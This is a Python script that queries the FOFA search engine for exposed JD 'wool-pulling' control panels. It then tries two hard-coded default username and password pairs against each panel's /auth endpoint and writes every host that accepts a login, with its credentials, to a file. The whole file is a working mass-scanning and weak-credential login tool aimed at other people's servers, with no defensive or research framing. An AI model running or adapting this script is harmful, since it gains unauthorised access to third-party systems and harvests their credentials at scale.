import requests
import base64

class Fofa():
    
    def __init__(self, email, key):
        self.email = email
        self.key = key
        self.host = "https://fofa.so"
        self.search_url = "/api/v1/search/all"
        self.login_url = "/api/v1/info/my"
    
    def get_userinfo(self):
        try:
            url = '{host}{login}'.format(host=self.host, login=self.login_url)
            parameter = {"email" : self.email, "key" : self.key}
            r = requests.get(url, params=parameter, timeout=5)
            print("fofa login access")
            return r.json()
        except:
            print("meeting an error when fofa login……")
            return None

    def get_searchinfo(self, query, page=1, full=True, size=100):
        try:
            url = '{host}{search}'.format(host=self.host, search=self.search_url)
            parameter = {"email" : self.email, "key" : self.key, "qbase64" : base64.b64encode(query.encode('utf-8')),"page" : page, "full" : full, "size" : size}
            r = requests.get(url, params=parameter, timeout=5)
            return r.json()['results']
        except:
            print("meeting an error when get fofa search info……")
            return None

class Haoyangmao():

    def __init__(self):
        self.data_old = {'username' : 'useradmin', 'password' : 'supermanito'}
        self.data_new = {'username' : 'admin', 'password' : 'adminadmin'}

    def get_index(self, ip, port):
        try:
            url = "http://{ip}:{port}".format(ip=ip, port=port)
            r = requests.get(url, timeout=5)
            # cookie = requests.utils.dict_from_cookiejar(r.cookies)
            if r.status_code == 200:
                po = self.post_login(url, self.data_old)
                if po:
                    return {'err' : 0, 'result' : self.data_old}
                po = self.post_login(url, self.data_new)
                if po:
                    return {'err' : 0, 'result' : self.data_new}
            else:
                return {'err' : 1, 'msg' : 'password_error'}
        except:
            return {'err' : 1, 'msg' : '404_wrong'}

    def post_login(self, url, data):
        try:
            po = requests.post(url+'/auth', data=data, timeout=5)
            return abs(int(po.json()['err'])-1)
        except:
            return None

def main(email, key, query, search_begin_page, search_size):
    # login
    fofa = Fofa(email, key)
    hym = Haoyangmao()
    assert fofa.get_userinfo()
    # search
    while True:
        with open('fofa_url.txt', 'a') as furl, open('fofa_logs.txt', 'a') as log:
            num = 0
            searchinfo = fofa.get_searchinfo(query, page=search_begin_page, size=search_size)
            assert searchinfo
            log.write("====begin to test the {} th page=====\n".format(search_begin_page))
            for _,ip,port in searchinfo:
                print(ip,port)
                # test weak key explode
                result = hym.get_index(ip, port)
                if result:
                    if result['err'] == 0:
                        furl.write("{ip} {port} {username} {password}\n".format(ip=ip, port=port, username=result['result']['username'], password=result['result']['password']))
                        print("get √")
                    num += 1
                    log.write("{num} {ip} {port} {res}\n".format(num=num, ip=ip, port=port, res=result['err']))
            log.write("====end to test the {} th page=====\n".format(search_begin_page))
            log.close()
            furl.close()
            search_begin_page += 1

if __name__=="__main__":
    # config
    email = 'xxxxxxxxxx'
    key = 'xxxxxxxxxxxxxxxxxxxxxx'
    query = 'title="京东薅羊毛控制面板"'
    search_begin_page = 1
    search_size = 40

    main(email, key, query, search_begin_page, search_size)
    